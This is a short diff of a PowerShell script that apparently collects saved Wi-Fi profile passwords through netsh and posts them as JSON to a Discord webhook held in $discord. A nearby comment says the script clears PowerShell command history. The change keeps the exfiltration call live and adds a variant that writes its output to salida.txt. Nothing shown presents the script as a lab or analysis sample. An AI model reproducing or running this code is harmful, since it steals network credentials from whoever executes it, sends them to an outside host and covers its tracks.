@@ -9,7 +9,9 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
 		'content' = [string]$passw
 	}
 	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) > salida.txt
+
 }
 
 # Clear the PowerShell command history
